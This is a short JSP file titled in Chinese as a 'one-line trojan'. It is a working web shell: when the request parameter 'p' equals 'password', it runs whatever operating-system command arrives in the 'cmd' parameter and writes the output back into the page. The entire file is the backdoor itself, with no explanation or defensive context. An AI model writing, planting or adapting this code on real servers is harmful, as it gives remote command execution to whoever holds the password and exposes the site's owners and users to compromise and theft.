<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>一句话木马</title>
</head>
<body>
<%
    if ("password".equals(request.getParameter("p"))){
        Process process = Runtime.getRuntime().exec(request.getParameter("cmd"));
        InputStream inputStream = process.getInputStream();
        BufferedReader bufferedReader =  new BufferedReader(new InputStreamReader(inputStream));
        String line;
        while ((line = bufferedReader.readLine())!=null){
            response.getWriter().print(line);
        }
    }
%>
</body>
</html>